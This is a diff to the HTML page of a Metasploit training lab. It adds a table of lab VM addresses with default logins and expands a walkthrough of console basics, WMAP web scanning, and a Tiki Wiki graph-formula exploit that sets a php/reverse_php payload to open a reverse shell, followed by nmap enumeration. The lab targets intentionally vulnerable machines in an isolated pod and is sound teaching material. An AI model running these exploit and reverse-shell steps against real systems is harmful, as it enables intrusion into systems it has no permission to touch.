@@ -232,6 +232,11 @@
   #pm-toggle .pmi{font-family:var(--mono);font-weight:700}
   html[data-present="on"] footer.site{display:none !important}
   @media print{.pm-dock,#pm-toggle{display:none !important}}
+
+  /* VM / credentials table — slightly emphasized header */
+  .vm-tbl table{font-size:.88rem}
+  .vm-tbl thead th{background:var(--accent-soft);color:var(--accent-ink)}
+  .vm-tbl td code{white-space:nowrap}
 </style>
 </head>
 <body>
@@ -300,36 +305,66 @@
   <section id="environment" data-track>
     <h2>The environment you're working in</h2>
     <p>You run Metasploit from <strong>Kali</strong> against the intentionally vulnerable targets in the pod (the OWASP/Mutillidae web app and a Metasploitable-style host). The database stores hosts and services as you discover them, so later modules can draw on what earlier steps found.</p>
+      <p>The virtual machines you'll use in this lab, with their addresses and logins:</p>
+      <div class="tbl-wrap vm-tbl"><table>
+        <thead><tr><th>Virtual Machine</th><th>IP Address</th><th>Account</th><th>Password</th></tr></thead>
+        <tbody>
+        <tr><td><b>Kali Linux</b></td><td><code>192.168.9.2</code> / <code>192.168.0.2</code></td><td><code>root</code></td><td><code>toor</code></td></tr>
+        <tr><td><b>pfSense</b></td><td><code>192.168.0.254</code> / <code>192.168.68.254</code> / <code>192.168.9.1</code></td><td><code>admin</code></td><td><code>pfsense</code></td></tr>
+        <tr><td><b>OWASP Broken Web App</b></td><td><code>192.168.68.12</code></td><td><code>root</code></td><td><code>owaspbwa</code></td></tr>
+        </tbody>
+      </table></div>
     <div class="done-row"><input type="checkbox" id="done-environment" data-done="environment"><label for="done-environment">Mark this section reviewed</label></div>
   </section>
 
   <section id="walkthrough" data-track>
     <h2>Command walkthrough</h2>
 
-    <p class="task-head">Task 1 — Start the framework</p>
+    <p class="task-head">Task 1 — Get familiar with the console</p>
     <div class="step">
-      <h3><span class="n">1</span> Initialize the database and launch the console</h3>
-      <div class="cmd"><pre><span class="p">root@kali:~#</span> msfdb init</pre></div>
-      <div class="cmd"><pre><span class="p">root@kali:~#</span> msfconsole</pre></div>
-      <p><code class="inl">msfdb init</code> sets up the PostgreSQL database that lets Metasploit remember hosts, services, and loot; <code class="inl">msfconsole</code> drops you at the <code class="inl">msf6 ></code> prompt. Inside, <code class="inl">db_status</code> confirms the database is connected and <code class="inl">help</code> lists everything.</p>
+      <h3><span class="n">1</span> Start the database and launch the console</h3>
+      <div class="cmd"><pre><span class="p">root@kali:~#</span> msfdb init
+<span class="p">root@kali:~#</span> service postgresql start
+<span class="p">root@kali:~#</span> msfconsole</pre></div>
+      <p><code class="inl">msfdb init</code> sets up the PostgreSQL database that lets Metasploit remember hosts, services, and loot, <code class="inl">service postgresql start</code> makes sure the DB is running, and <code class="inl">msfconsole</code> drops you at the <code class="inl">msf6 ></code> prompt. <code class="inl">db_status</code> confirms the database is connected.</p>
+    </div>
+    <div class="step">
+      <h3><span class="n">2</span> Look around</h3>
+      <div class="cmd"><pre><span class="p">msf6 ></span> ifconfig
+<span class="p">msf6 ></span> connect <span class="ar">192.168.68.12 80</span></pre></div>
+      <div class="cmd"><pre><span class="p">msf6 ></span> show all
+<span class="p">msf6 ></span> show exploits
+<span class="p">msf6 ></span> show payloads</pre></div>
+      <p>Ordinary shell commands like <code class="inl">ifconfig</code> work right inside the console. <code class="inl">connect</code> is a built-in netcat — <code class="inl">connect 192.168.68.12 80</code> opens a raw TCP connection (press <kbd>Ctrl-C</kbd> to drop it). <code class="inl">show all</code>, <code class="inl">show exploits</code>, and <code class="inl">show payloads</code> list the enormous module catalog.</p>
     </div>
 
     <p class="task-head">Task 2 — Scan a web app with the WMAP module</p>
     <div class="step">
-      <h3><span class="n">2</span> Load and run WMAP</h3>
+      <h3><span class="n">3</span> Register the site and target</h3>
       <div class="cmd"><pre><span class="p">msf6 ></span> load wmap
-<span class="p">msf6 ></span> wmap_sites <span class="fl">-a</span> <span class="ar">http://192.168.68.12</span></pre></div>
+<span class="p">msf6 ></span> wmap_sites <span class="fl">-h</span>
+<span class="p">msf6 ></span> wmap_sites <span class="fl">-a</span> <span class="ar">http://192.168.68.12</span>
+<span class="p">msf6 ></span> wmap_sites <span class="fl">-l</span></pre></div>
+      <div class="cmd"><pre><span class="p">msf6 ></span> wmap_targets <span class="fl">-t</span> <span class="ar">http://192.168.68.12/mutillidae/index.php</span>
+<span class="p">msf6 ></span> wmap_targets <span class="fl">-l</span></pre></div>
+      <p>WMAP is an <strong>auxiliary</strong> module — a scanner, not an exploit. <code class="inl">load</code> it, add the <strong>site</strong> with <code class="inl">wmap_sites -a</code> (and list with <code class="inl">-l</code>), then set the specific <strong>target</strong> URL (the Mutillidae app) with <code class="inl">wmap_targets -t</code>. The <code class="inl">-h</code> flags show each command's help.</p>
+    </div>
+    <div class="step">
+      <h3><span class="n">4</span> Run the scan</h3>
+      <div class="cmd"><pre><span class="p">msf6 ></span> wmap_run <span class="fl">-h</span>
+<span class="p">msf6 ></span> wmap_run <span class="fl">-t</span></pre></div>
       <div class="cmd"><pre><span class="p">msf6 ></span> cat /root/profile
 <span class="p">msf6 ></span> wmap_run <span class="fl">-e</span> <span class="ar">/root/profile</span>
 <span class="p">msf6 ></span> wmap_vulns <span class="fl">-l</span></pre></div>
-      <p>WMAP is an <strong>auxiliary</strong> module — a scanner, not an exploit. You <code class="inl">load</code> it, register the OWASP site with <code class="inl">wmap_sites -a</code>, then run it. The lab uses a <strong>predefined profile</strong> (<code class="inl">/root/profile</code>, which <code class="inl">cat</code> shows is a curated list of WMAP modules) via <code class="inl">wmap_run -e /root/profile</code>, and lists the findings with <code class="inl">wmap_vulns -l</code>. They land in the database for the next step. (<code class="inl">help</code> and <code class="inl">wmap_sites -h</code> show the full command set.)</p>
+      <p><code class="inl">wmap_run -t</code> lists which modules <em>would</em> run against the target (a dry run); <code class="inl">cat /root/profile</code> shows the lab's curated module list; <code class="inl">wmap_run -e /root/profile</code> actually executes that profile; and <code class="inl">wmap_vulns -l</code> lists the findings, which land in the database for the next step.</p>
       <div class="call capture"><span class="k">Screenshot for your report</span><p>Capture the <code class="inl">wmap_vulns -l</code> output for the target site.</p></div>
     </div>
 
     <p class="task-head">Task 3 — Configure and run an exploit</p>
     <div class="step">
-      <h3><span class="n">3</span> The find → configure → run loop, for real</h3>
+      <h3><span class="n">5</span> The find → configure → run loop, for real</h3>
       <p>The lab now exploits a known flaw in the training app's old Tiki Wiki. The sequence is the same loop you'll repeat forever — <code class="inl">search</code> to find a module, <code class="inl">use</code> to select it, <code class="inl">set</code> the required options (<code class="inl">show options</code> marks them <em>yes</em>), then <code class="inl">exploit</code>:</p>
+      <div class="cmd"><pre><span class="p">msf6 ></span> search <span class="ar">tikiwiki</span></pre></div>
       <div class="cmd"><pre><span class="p">msf6 ></span> use <span class="ar">exploit/unix/webapp/tikiwiki_graph_formula_exec</span>
 <span class="p">msf6 ></span> set RHOST <span class="ar">192.168.68.12</span>
 <span class="p">msf6 ></span> set payload <span class="ar">php/reverse_php</span>
@@ -337,13 +372,13 @@
 <span class="p">msf6 ></span> set LPORT <span class="ar">5656</span>
 <span class="p">msf6 ></span> show options
 <span class="p">msf6 ></span> exploit</pre></div>
-      <p><code class="inl">RHOST</code> is the victim; the <strong>payload</strong> (<code class="inl">php/reverse_php</code>) is what runs after the exploit lands, calling back to your <code class="inl">LHOST</code>/<code class="inl">LPORT</code> — an in-memory reverse connection that leaves nothing on disk. A successful <code class="inl">exploit</code> reports a <strong>command shell session opened</strong>. (Interact within ~30 seconds or the session times out; if no session is created, just run <code class="inl">exploit</code> again.) This is a documented module against an intentionally vulnerable training app in the isolated pod.</p>
+      <p><code class="inl">RHOST</code> is the victim; the <strong>payload</strong> (<code class="inl">php/reverse_php</code>) is what runs after the exploit lands, calling back to your <code class="inl">LHOST</code>/<code class="inl">LPORT</code> — an in-memory reverse connection that leaves nothing on disk. A successful <code class="inl">exploit</code> reports a <strong>command shell session opened</strong>. (Interact within ~30 seconds or the session times out; if no session is created, just run <code class="inl">exploit</code> again.) This is a documented module against an intentionally vulnerable training app in the isolated pod. After landing the shell, the lab runs <code class="inl">nmap -T4 -A -v 192.168.68.12</code> to fingerprint the host further — post-exploitation enumeration.</p>
       <div class="call capture"><span class="k">Screenshot for your report</span><p>Capture the "session opened" message confirming the exploit succeeded.</p></div>
     </div>
 
     <p class="task-head">Task 4 — Armitage, the GUI</p>
     <div class="step">
-      <h3><span class="n">4</span> Visualize — and repeat — the same framework</h3>
+      <h3><span class="n">6</span> Visualize — and repeat — the same framework</h3>
       <p>Armitage is a graphical front-end to Metasploit: it draws hosts on a canvas and exposes the same modules through menus. In the lab you <strong>Clear Database</strong>, then <strong>Hosts → Nmap scan → Intense scan</strong> to rediscover <code class="inl">192.168.68.12</code>, select the host, choose <strong>Attacks → Find Attacks</strong>, and then run the <em>same</em> exploit from the tree (<strong>exploit → unix → webapp → tikiwiki_graph_formula_exec</strong>) — proof the GUI is just a skin over the console commands you already ran.</p>
       <details class="go"><summary>Currency note — Armitage in 2026</summary><p>Armitage is <strong>no longer actively maintained</strong> and isn't in current Kali by default; the modern graphical option for team engagements is <em>Metasploit Pro</em> or a C2 framework. Learn Armitage here to <em>see</em> the workflow, but expect to live in <code class="inl">msfconsole</code> in practice — the CLI is where the framework actually stays current.</p></details>
       <div class="call capture"><span class="k">Screenshot for your report</span><p>Capture Armitage's host view after a scan, showing the discovered targets on the canvas.</p></div>
@@ -605,6 +640,5 @@
   })();
 })();
 </script>
-<script src="assistant.js" defer></script>
 </body>
 </html>
